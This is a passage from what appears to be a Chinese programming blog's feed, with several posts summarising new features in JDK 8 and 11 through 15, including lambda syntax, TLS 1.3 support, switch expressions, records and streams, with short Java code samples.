<p>从 Java 10 开始，便引入了局部变量类型推断这一关键特性。类型推断允许使用关键字 var 作为局部变量的类型而不是实际类型，编译器根据分配给变量的值推断出类型。这一改进简化了代码编写、节省了开发者的工作时间，因为不再需要显式声明局部变量的类型，而是可以使用关键字 var，且不会使源代码过于复杂。</p>
<p>可以使用关键字 var 声明局部变量，如下所示：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">"Hello Java 11"</span>;</span><br><span class="line">System.out.println(s);</span><br></pre></td></tr></table></figure></p>
<p>但是在 Java 10 中，还有下面几个限制：</p>
<ul>
<li>只能用于局部变量上</li>
<li>声明时必须初始化</li>
<li>不能用作方法参数</li>
<li>不能在 Lambda 表达式中使用</li>
</ul>
<p>Java 11 与 Java 10 的不同之处在于允许开发者在 Lambda 表达式中使用 var 进行参数声明。乍一看，这一举措似乎有点多余，因为在写代码过程中可以省略 Lambda 参数的类型，并通过类型推断确定它们。但是，添加上类型定义同时使用 @Nonnull 和 @Nullable 等类型注释还是很有用的，既能保持与局部变量的一致写法，也不丢失代码简洁。</p>
<p>Lambda 表达式使用隐式类型定义，它形参的所有类型全部靠推断出来的。隐式类型 Lambda 表达式如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(x, y) -&gt; x.process(y)</span><br></pre></td></tr></table></figure>
<p>Java 10 为局部变量提供隐式定义写法如下：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> Foo();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> x : xs) &#123; ... &#125;</span><br><span class="line"><span class="keyword">try</span> (<span class="keyword">var</span> x = ...) &#123; ... &#125; <span class="keyword">catch</span> ...</span><br></pre></td></tr></table></figure></p>
<p>为了 Lambda 类型表达式中正式参数定义的语法与局部变量定义语法的不一致，且为了保持与其他局部变量用法上的一致性，希望能够使用关键字 var 隐式定义 Lambda 表达式的形参：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">var</span> x, <span class="keyword">var</span> y) -&gt; x.process(y)</span><br></pre></td></tr></table></figure>
<p>于是在 Java 11 中将局部变量和 Lambda 表达式的用法进行了统一，并且可以将注释应用于局部变量和 Lambda 表达式：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nonnull</span> <span class="keyword">var</span> x = <span class="keyword">new</span> Foo();</span><br><span class="line">(<span class="meta">@Nonnull</span> <span class="keyword">var</span> x, <span class="meta">@Nullable</span> <span class="keyword">var</span> y) -&gt; x.process(y)</span><br></pre></td></tr></table></figure></p>
<h2 id="支持-TLS-1-3-协议"><a href="#支持-TLS-1-3-协议" class="headerlink" title="支持 TLS 1.3 协议"></a>支持 TLS 1.3 协议</h2><p>Java 11 中包含了传输层安全性（TLS）1.3 规范（RFC 8446）的实现，替换了之前版本中包含的 TLS，包括 TLS 1.2，同时还改进了其他 TLS 功能，例如 OCSP 装订扩展（RFC 6066，RFC 6961），以及会话散列和扩展主密钥扩展（RFC 7627），在安全性和性能方面也做了很多提升。</p>
<p>新版本中包含了 Java 安全套接字扩展（JSSE）提供 SSL，TLS 和 DTLS 协议的框架和 Java 实现。目前，JSSE API 和 JDK 实现支持 SSL 3.0，TLS 1.0，TLS 1.1，TLS 1.2，DTLS 1.0 和 DTLS 1.2。</p>
<p>同时 Java 11 版本中实现的 TLS 1.3，重新定义了以下新标准算法名称：</p>
<ul>
<li>TLS 协议版本名称：TLSv1.3</li>
<li>SSLContext 算法名称：TLSv1.3</li>
<li>TLS 1.3 的 TLS 密码套件名称：TLS_AES_128_GCM_SHA256，TLS_AES_256_GCM_SHA384</li>
<li>用于 X509KeyManager 的 keyType：RSASSA-PSS</li>
<li>用于 X509TrustManager 的 authType：RSASSA-PSS</li>
</ul>
<p>还为 TLS 1.3 添加了一个新的安全属性 jdk.tls.keyLimits。当处理了特定算法的指定数据量时，触发握手后，密钥和 IV 更新以导出新密钥。还添加了一个新的系统属性 jdk.tls.server.protocols，用于在 SunJSSE 提供程序的服务器端配置默认启用的协议套件。</p>
<p>之前版本中使用的 KRB5​​密码套件实现已从 Java 11 中删除，因为该算法已不再安全。同时注意，TLS 1.3 与以前的版本不直接兼容。</p>
<p>升级到 TLS 1.3 之前，需要考虑如下几个兼容性问题：</p>
<ul>
<li>TLS 1.3 使用半关闭策略，而 TLS 1.2 以及之前版本使用双工关闭策略，对于依赖于双工关闭策略的应用程序，升级到 TLS 1.3 时可能存在兼容性问题。</li>
<li>TLS 1.3 使用预定义的签名算法进行证书身份验证，但实际场景中应用程序可能会使用不被支持的签名算法。</li>
<li>TLS 1.3 再支持 DSA 签名算法，如果在服务器端配置为仅使用 DSA 证书，则无法升级到 TLS 1.3。</li>
<li>TLS 1.3 支持的加密套件与 TLS 1.2 和早期版本不同，若应用程序硬编码了加密算法单元，则在升级的过程中需要修改相应代码才能升级使用 TLS 1.3。</li>
<li>TLS 1.3 版本的 session 用行为及秘钥更新行为与 1.2 及之前的版本不同，若应用依赖于 TLS 协议的握手过程细节，则需要注意。</li>
</ul>
<h2 id="其他特性"><a href="#其他特性" class="headerlink" title="其他特性"></a>其他特性</h2><p>其他的看不懂，不写出来了。</p>
<p>更多信息请看 <a href="https://www.ibm.com/developerworks/cn/java/the-new-features-of-Java-11/index.html" target="_blank" rel="noopener">Java 11 新特性介绍</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>JDK 12 新特性</title>
    <url>/Java/JDK%2012%20%E6%96%B0%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<p>2019年3月19日 <code>JDK 12</code> 发布，非LTS 版本。</p>
<p><a href="http://openjdk.java.net/projects/jdk/12/" target="_blank" rel="noopener">新特性</a></p>
<ul>
<li>189:     Shenandoah: A Low-Pause-Time Garbage Collector (Experimental)</li>
<li>230:     Microbenchmark Suite</li>
<li>325:     Switch Expressions (Preview)</li>
<li>334:     JVM Constants API</li>
<li>340:     One AArch64 Port, Not Two</li>
<li>341:     Default CDS Archives</li>
<li>344:     Abortable Mixed Collections for G1</li>
<li>346:     Promptly Return Unused Committed Memory from G1</li>
</ul>
<p><a href="https://segmentfault.com/a/1190000018588495" target="_blank" rel="noopener">中文</a></p>
<ul>
<li>189:     Shenandoah 垃圾回收器</li>
<li>230:     在jdk源码里头新增了一套基础的Microbenchmark Suite</li>
<li>325:     对switch进行了增强 (Preview) 支持“ -&gt; ”</li>
<li>334:     新增了JVM Constants API</li>
<li>340:     一个AArch64端口</li>
<li>341:     默认CDS归档</li>
<li>344:     可中断的G1垃圾回收器</li>
<li>346:     通过G1更及时的返回未使用的内存</li>
</ul>
<hr>
<p>Java 12 已如期于 2019 年 3 月 19 日正式发布，此次更新是 Java 11 这一长期支持版本发布之后的一次常规更新，带来了不少 JVM、GC 功能增强、改进。</p>
<h2 id="垃圾收集器：Shenandoah"><a href="#垃圾收集器：Shenandoah" class="headerlink" title="垃圾收集器：Shenandoah"></a>垃圾收集器：Shenandoah</h2><p>Java 12 中引入一个新的垃圾收集器：Shenandoah，它是作为一中低停顿时间的垃圾收集器而引入到 Java 12 中的，其工作原理是通过与 Java 应用程序中的执行线程同时运行，用以执行其垃圾收集、内存回收任务，通过这种运行方式，给虚拟机带来短暂的停顿时间。 </p>
<h2 id="Switch-表达式扩展（预览功能）"><a href="#Switch-表达式扩展（预览功能）" class="headerlink" title="Switch 表达式扩展（预览功能）"></a>Switch 表达式扩展（预览功能）</h2><p> Java 11 以及之前 Java 版本中的 Switch 语句是按照类似 C、C++ 这样的语言来设计的，在默认情况下支持 fall-through 语法。虽然这种传统的控制流通常用于编写低级代码，但 Switch 控制语句通常运用在高级别语言环境下的，因此其容易出错性掩盖其灵活性。 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> dayNumber = <span class="keyword">switch</span> (day) &#123;</span><br><span class="line">    <span class="keyword">case</span> MONDAY, FRIDAY, SUNDAY -&gt; <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">case</span> TUESDAY                -&gt; <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">case</span> THURSDAY, SATURDAY     -&gt; <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">case</span> WEDNESDAY              -&gt; <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">default</span>                      -&gt; <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Huh? "</span> + day);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Java 11 以及之前版本中，Switch 表达式支持下面类型： byte、char、short、int、Byte、Character、Short、Integer、enum、tring，在未来的某个 Java 版本有可能会允许支持 float、double 和 long （以及上面类型的封装类型）。 </p>
<h2 id="其他特性"><a href="#其他特性" class="headerlink" title="其他特性"></a>其他特性</h2><p>其他的看不懂，不写出来了。</p>
<p>更多信息请看 <a href="https://www.ibm.com/developerworks/cn/java/the-new-features-of-Java-12/index.html" target="_blank" rel="noopener">Java 12 新特性介绍</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>JDK 15 新特性</title>
    <url>/Java/JDK%2015%20%E6%96%B0%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<p>2020年9月15日 <code>JDK 15</code> 发布，非 LTS 版本。</p>
<p><a href="http://openjdk.java.net/projects/jdk/15/" target="_blank" rel="noopener">新特性</a></p>
<ul>
<li>339:     Edwards-Curve Digital Signature Algorithm (EdDSA)</li>
<li>360:     Sealed Classes (Preview)</li>
<li>371:     Hidden Classes </li>
<li>372:     Remove the Nashorn JavaScript Engine</li>
<li>373:     Reimplement the Legacy DatagramSocket API</li>
<li>374:     Disable and Deprecate Biased Locking</li>
<li>375:     Pattern Matching for instanceof (Second Preview)</li>
<li>377:     ZGC: A Scalable Low-Latency Garbage Collector</li>
<li>378:     Text Blocks</li>
<li>379:     Shenandoah: A Low-Pause-Time Garbage Collector</li>
<li>381:     Remove the Solaris and SPARC Ports</li>
<li>383:     Foreign-Memory Access API (Second Incubator)</li>
<li>384:     Records (Second Preview)</li>
<li>385:     Deprecate RMI Activation for Removal</li>
</ul>
<p>中文</p>
<ul>
<li>339:     使用Edwards-Curve数字签名算法（EdDSA）实现加密签名</li>
<li>360:     密封类 Sealed Classes (Preview) </li>
<li>371:     隐藏类 Hidden Classes </li>
<li>372:     删除Nashorn JavaScript脚本引擎和API，以及jjs工具</li>
<li>373:     重新实现旧版DatagramSocket API，代替java.net.DatagramSocket和java.net.MulticastSocketAPI的基础实现</li>
<li>374:     默认情况下禁用偏向锁，并弃用所有相关的命令行选项。</li>
<li>375:     通过对instanceof运算符进行模式匹配来增强Java编程语言(Second Preview)</li>
<li>377:     将ZGC垃圾收集器从实验功能更改为产品功能。</li>
<li>378:     将文本块添加到Java语言</li>
<li>379:     Shenandoah垃圾回收从实验特性变为产品特性。</li>
<li>381:     删除源代码并构建对Solaris/SPARC，Solaris/x64和Linux/SPARC端口的支持</li>
<li>383:     引入一个API，以允许Java程序安全有效地访问Java堆之外的外部内存。</li>
<li>384:     Records提供了一种紧凑的语法来声明类，以帮助开发者写出更简洁的代码(Second Preview)</li>
<li>385:     弃用RMI激活机制以便将来删除</li>
</ul>
<p>Sealed Classes (Preview) 密封类，通过sealed关键字修饰抽象类限定只允许指定的子类才可以实现或继承抽象类，避免抽象类被滥用。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>JDK 13 新特性</title>
    <url>/Java/JDK%2013%20%E6%96%B0%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<p>2019年09月17日 <code>JDK 13</code> 发布，非 LTS 版本。</p>
<p><a href="http://openjdk.java.net/projects/jdk/13/" target="_blank" rel="noopener">新特性</a></p>
<ul>
<li>350:     Dynamic CDS Archives</li>
<li>351:     ZGC: Uncommit Unused Memory ZGC优化</li>
<li>353:     Reimplement the Legacy Socket API Socket的底层实现优化</li>
<li>354:     Switch Expressions (Preview) switch表达式增加yield关键字用于返回结果，作用类似于return</li>
<li>355:     Text Blocks (Preview) 使用 “”” 三个双引号表示文本块</li>
</ul>
<p>中文</p>
<ul>
<li>350:     对 Java 10 中引入的 应用程序类数据共享进行了进一步的简化、改进和扩展</li>
<li>351:     ZGC优化</li>
<li>353:     Socket的底层实现优化</li>
<li>354:     switch表达式增加yield关键字用于返回结果，作用类似于return</li>
<li>355:     使用 “”” 三个双引号表示文本块</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>JDK 14 新特性</title>
    <url>/Java/JDK%2014%20%E6%96%B0%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<p>2020年3月17日 <code>JDK 14</code> 发布，非 LTS 版本。</p>
<p><a href="http://openjdk.java.net/projects/jdk/14/" target="_blank" rel="noopener">新特性</a></p>
<ul>
<li>305:     Pattern Matching for instanceof (Preview)</li>
<li>343:     Packaging Tool (Incubator)</li>
<li>345:     NUMA-Aware Memory Allocation for G1</li>
<li>349:     JFR Event Streaming</li>
<li>352:     Non-Volatile Mapped Byte Buffers</li>
<li>358:     Helpful NullPointerExceptions</li>
<li>359:     Records (Preview)</li>
<li>361:     Switch Expressions (Standard)</li>
<li>362:     Deprecate the Solaris and SPARC Ports</li>
<li>363:     Remove the Concurrent Mark Sweep (CMS) Garbage Collector</li>
<li>364:     ZGC on macOS</li>
<li>365:     ZGC on Windows</li>
<li>366:     Deprecate the ParallelScavenge + SerialOld GC Combination</li>
<li>367:     Remove the Pack200 Tools and API</li>
<li>368:     Text Blocks (Second Preview)</li>
<li>370:     Foreign-Memory Access API (Incubator)</li>
</ul>
<p>中文</p>
<ul>
<li>305:     instanceof的模式匹配 (预览)</li>
<li>343:     打包工具 (Incubator)</li>
<li>345:     G1的NUMA内存分配优化</li>
<li>349:     JFR事件流</li>
<li>352:     非原子性的字节缓冲区映射</li>
<li>358:     友好的空指针异常</li>
<li>359:     Records (预览)</li>
<li>361:     Switch表达式扩展 (标准)</li>
<li>362:     弃用Solaris和SPARC端口</li>
<li>363:     移除CMS（Concurrent Mark Sweep）垃圾收集器</li>
<li>364:     macOS系统上的ZGC</li>
<li>365:     Windows系统上的ZGC</li>
<li>366:     弃用ParallelScavenge + SerialOld GC组合</li>
<li>367:     移除Pack200 Tools和API</li>
<li>368:     文本块 (第二个预览版)</li>
<li>370:     外部存储器API (Incubator)</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (o <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    String s = (String)o;</span><br><span class="line">    ... use s ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// New code</span></span><br><span class="line"><span class="keyword">if</span> (o <span class="keyword">instanceof</span> String s) &#123;</span><br><span class="line">    ... use s ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// instanceof 太多</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> String <span class="title">formatter</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    String formatted = <span class="string">"unknown"</span>;</span><br><span class="line">    <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Integer i) &#123;</span><br><span class="line">        formatted = String.format(<span class="string">"int %d"</span>, i);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Long l) &#123;</span><br><span class="line">        formatted = String.format(<span class="string">"long %d"</span>, l);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Double d) &#123;</span><br><span class="line">        formatted = String.format(<span class="string">"double %f"</span>, d);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (o <span class="keyword">instanceof</span> String s) &#123;</span><br><span class="line">        formatted = String.format(<span class="string">"String %s"</span>, s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> formatted;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用switch</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> String <span class="title">formatterPatternSwitch</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">switch</span> (o) &#123;</span><br><span class="line">        <span class="keyword">case</span> Integer i -&gt; String.format(<span class="string">"int %d"</span>, i);</span><br><span class="line">        <span class="keyword">case</span> Long l    -&gt; String.format(<span class="string">"long %d"</span>, l);</span><br><span class="line">        <span class="keyword">case</span> Double d  -&gt; String.format(<span class="string">"double %f"</span>, d);</span><br><span class="line">        <span class="keyword">case</span> String s  -&gt; String.format(<span class="string">"String %s"</span>, s);</span><br><span class="line">        <span class="keyword">default</span>        -&gt; o.toString();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://xie.infoq.cn/article/23a86a682f6d050bf145dee96" target="_blank" rel="noopener">参考</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>JDK 8 新特性</title>
    <url>/Java/JDK%208%20%E6%96%B0%E7%89%B9%E6%80%A72/</url>
    <content><![CDATA[<p><a href="https://www.ibm.com/developerworks/cn/java/j-lo-jdk8newfeature/index.html" target="_blank" rel="noopener">原文链接</a></p>
<h2 id="函数式接口"><a href="#函数式接口" class="headerlink" title="函数式接口"></a>函数式接口</h2><p>Java 8 引入的一个核心概念是函数式接口（Functional Interfaces）。通过在接口里面添加一个抽象方法，这些方法可以直接从接口中运行。如果一个接口定义个唯一一个抽象方法，那么这个接口就成为函数式接口。同时，引入了一个新的注解：@FunctionalInterface。可以把他它放在一个接口前，表示这个接口是一个函数式接口。这个注解是非必须的，只要接口只包含一个方法的接口，虚拟机会自动判断，不过最好在接口上使用注解 @FunctionalInterface 进行声明。在接口中添加了 @FunctionalInterface 的接口，只允许有一个抽象方法，否则编译器也会报错。</p>
<p>java.lang.Runnable 就是一个函数式接口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Lambda-表达式"><a href="#Lambda-表达式" class="headerlink" title="Lambda 表达式"></a>Lambda 表达式</h2><p>函数式接口的重要属性是：我们能够使用 Lambda 实例化它们，Lambda 表达式让你能够将函数作为方法参数，或者将代码作为数据对待。Lambda 表达式的引入给开发者带来了不少优点：在 Java 8 之前，匿名内部类，监听器和事件处理器的使用都显得很冗长，代码可读性很差，Lambda 表达式的应用则使代码变得更加紧凑，可读性增强；Lambda 表达式使并行操作大集合变得很方便，可以充分发挥多核 CPU 的优势，更易于为多核处理器编写代码；</p>
<p>Lambda 表达式由三个部分组成：第一部分为一个括号内用逗号分隔的形式参数，参数是函数式接口里面方法的参数；第二部分为一个箭头符号：-&gt;；第三部分为方法体，可以是表达式和代码块。语法如下：</p>
<ol>
<li>方法体为表达式，该表达式的值作为返回值返回。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(parameters) -&gt; expression</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>方法体为代码块，必须用 {} 来包裹起来，且需要一个 return 返回值，但若函数式接口里面方法返回值是 void，则无需返回值。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(parameters) -&gt; &#123; statements; &#125;</span><br></pre></td></tr></table></figure>
<p>例如，下面是使用匿名内部类和 Lambda 表达式的代码比较。</p>
<p>下面是用匿名内部类的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">System.out.print(<span class="string">"Helllo Lambda in actionPerformed"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>下面是使用 Lambda 表达式后：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button.addActionListener(</span><br><span class="line">\\actionPerformed 有一个参数 e 传入，所以用 (ActionEvent e)</span><br><span class="line">(ActionEvent e)-&gt; </span><br><span class="line">System.out.print(<span class="string">"Helllo Lambda in actionPerformed"</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>上面是方法体包含了参数传入 (ActionEvent e)，如果没有参数则只需 ( )，例如 Thread 中的 run 方法就没有参数传入，当它使用 Lambda 表达式后：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread t = <span class="keyword">new</span> Thread(</span><br><span class="line">\\run 没有参数传入，所以用 (), 后面用 &#123;&#125; 包起方法体</span><br><span class="line">() -&gt; &#123;</span><br><span class="line"> System.out.println(<span class="string">"Hello from a thread in run"</span>);</span><br><span class="line">&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>通过上面两个代码的比较可以发现使用 Lambda 表达式可以简化代码，并提高代码的可读性。<br>为了进一步简化 Lambda 表达式，可以使用方法引用。例如，下面三种分别是使用内部类，使用 Lambda 表示式和使用方法引用方式的比较：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1. 使用内部类</span></span><br><span class="line">Function&lt;Integer, String&gt; f = <span class="keyword">new</span> Function&lt;Integer,String&gt;()&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">apply</span><span class="params">(Integer t)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//2. 使用 Lambda 表达式</span></span><br><span class="line">Function&lt;Integer, String&gt; f2 = (t)-&gt;String.valueOf(t); </span><br><span class="line"><span class="comment">//3. 使用方法引用的方式</span></span><br><span class="line">Function&lt;Integer, String&gt; f1 = String::valueOf;</span><br></pre></td></tr></table></figure></p>
<p>要使用 Lambda 表达式，需要定义一个函数式接口，这样往往会让程序充斥着过量的仅为 Lambda 表达式服务的函数式接口。为了减少这样过量的函数式接口，Java 8 在 java.util.function 中增加了不少新的函数式通用接口。例如：</p>
<p>Function&lt;T, R&gt;：将 T 作为输入，返回 R 作为输出，他还包含了和其他函数组合的默认方法。</p>
<p>Predicate<t> ：将 T 作为输入，返回一个布尔值作为输出，该接口包含多种默认方法来将 Predicate 组合成其他复杂的逻辑（与、或、非）。</t></p>
<p>Consumer<t> ：将 T 作为输入，不返回任何内容，表示在单个参数上的操作。</t></p>
<p>例如，People 类中有一个方法 getMaleList 需要获取男性的列表，这里需要定义一个函数式接口<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PersonInterface：</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">PersonInterface</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">test</span><span class="params">(Person person)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">People</span> </span>&#123;</span><br><span class="line"> <span class="keyword">private</span> List&lt;Person&gt; persons= <span class="keyword">new</span> ArrayList&lt;Person&gt;();</span><br><span class="line"> <span class="function"><span class="keyword">public</span> List&lt;Person&gt; <span class="title">getMaleList</span><span class="params">(PersonInterface filter)</span> </span>&#123;</span><br><span class="line"> List&lt;Person&gt; res = <span class="keyword">new</span> ArrayList&lt;Person&gt;();</span><br><span class="line"> persons.forEach(</span><br><span class="line"> (Person person) -&gt; </span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">if</span> (filter.test(person)) &#123;<span class="comment">//调用 PersonInterface 的方法</span></span><br><span class="line"> res.add(person);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> );</span><br><span class="line"> <span class="keyword">return</span> res;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>为了去除 PersonInterface 这个函数式接口，可以用通用函数式接口 Predicate 替代如下：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span></span>&#123;</span><br><span class="line"> <span class="keyword">private</span> List&lt;Person&gt; persons= <span class="keyword">new</span> ArrayList&lt;Person&gt;();</span><br><span class="line"> <span class="function"><span class="keyword">public</span> List&lt;Person&gt; <span class="title">getMaleList</span><span class="params">(Predicate&lt;Person&gt; predicate)</span> </span>&#123;</span><br><span class="line"> List&lt;Person&gt; res = <span class="keyword">new</span> ArrayList&lt;Person&gt;();</span><br><span class="line"> persons.forEach(</span><br><span class="line"> person -&gt; &#123;</span><br><span class="line"> <span class="keyword">if</span> (predicate.test(person)) &#123;<span class="comment">//调用 Predicate 的抽象方法 test</span></span><br><span class="line"> res.add(person);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"> <span class="keyword">return</span> res;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="接口的增强"><a href="#接口的增强" class="headerlink" title="接口的增强"></a>接口的增强</h2><p>Java 8 对接口做了进一步的增强。在接口中可以添加使用 default 关键字修饰的非抽象方法。还可以在接口中定义静态方法。如今，接口看上去与抽象类的功能越来越类似了。<br>默认方法</p>
<p>Java 8 还允许我们给接口添加一个非抽象的方法实现，只需要使用 default 关键字即可，这个特征又叫做扩展方法。在实现该接口时，该默认扩展方法在子类上可以直接使用，它的使用方式类似于抽象类中非抽象成员方法。但扩展方法不能够重载 Object 中的方法。例如：toString、equals、 hashCode 不能在接口中被重载。</p>
<p>例如，下面接口中定义了一个默认方法 count()，该方法可以在子类中直接使用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">DefaultFunInterface</span> </span>&#123;</span><br><span class="line"><span class="comment">//定义默认方法 count</span></span><br><span class="line"><span class="function"><span class="keyword">default</span> <span class="keyword">int</span> <span class="title">count</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SubDefaultFunClass</span> <span class="keyword">implements</span> <span class="title">DefaultFunInterface</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"><span class="comment">//实例化一个子类对象，改子类对象可以直接调用父接口中的默认方法 count</span></span><br><span class="line"> SubDefaultFunClass sub = <span class="keyword">new</span> SubDefaultFunClass();</span><br><span class="line">sub.count();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>静态方法</p>
<p>在接口中，还允许定义静态的方法。接口中的静态方法可以直接用接口来调用。</p>
<p>例如，下面接口中定义了一个静态方法 find，该方法可以直接用 StaticFunInterface .find() 来调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">StaticFunInterface</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestStaticFun</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"><span class="comment">//接口中定义了静态方法 find 直接被调用</span></span><br><span class="line">StaticFunInterface.fine();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="集合之流式操作"><a href="#集合之流式操作" class="headerlink" title="集合之流式操作"></a>集合之流式操作</h2><p>Java 8 引入了流式操作（Stream），通过该操作可以实现对集合（Collection）的并行处理和函数式操作。根据操作返回的结果不同，流式操作分为中间操作和最终操作两种。最终操作返回一特定类型的结果，而中间操作返回流本身，这样就可以将多个操作依次串联起来。根据流的并发性，流又可以分为串行和并行两种。流式操作实现了集合的过滤、排序、映射等功能。</p>
<p>Stream 和 Collection 集合的区别：Collection 是一种静态的内存数据结构，而 Stream 是有关计算的。前者是主要面向内存，存储在内存中，后者主要是面向 CPU，通过 CPU 实现计算。<br>串行和并行的流</p>
<p>流有串行和并行两种，串行流上的操作是在一个线程中依次完成，而并行流则是在多个线程上同时执行。并行与串行的流可以相互切换：通过 stream.sequential() 返回串行的流，通过 stream.parallel() 返回并行的流。相比较串行的流，并行的流可以很大程度上提高程序的执行效率。</p>
<p>下面是分别用串行和并行的方式对集合进行排序。</p>
<p>串行排序：</p>
